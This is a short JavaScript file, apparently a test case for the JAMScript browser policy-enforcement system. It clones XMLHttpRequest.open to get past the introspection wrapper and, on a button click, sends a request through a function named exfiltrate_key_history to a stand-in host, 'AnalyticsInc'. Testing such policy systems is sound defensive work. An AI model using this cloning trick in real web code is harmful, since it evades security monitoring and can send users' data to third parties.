function exfiltrate_key_history() {
  function v0() {
    function temp() {
      return JAMScript.callIntrospect(that.apply, that, [this, arguments], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)
    }
    var that = this;
    var key$$14;
    for(key$$14 in this) {
      var v1 = JAMScript.callIntrospect(this.hasOwnProperty, this, [key$$14], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
      if(v1) {
        JAMScript.set(temp, key$$14, this[key$$14])
      }
    }
    return temp
  }
  xmlhttp = new XMLHttpRequest;
  var v2 = xmlhttp.open;
  v2.clone = v0;
  var v3 = xmlhttp;
  var v5 = xmlhttp.open;
  var v6 = JAMScript.callIntrospect(v5.clone, v5, [], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  v3.opennew = v6;
  JAMScript.callIntrospect(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  JAMScript.callIntrospect(xmlhttp.send, xmlhttp, [null], JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  return
}
var v4 = document.getElementById("test");
JAMScript.set(v4, "onclick", exfiltrate_key_history);

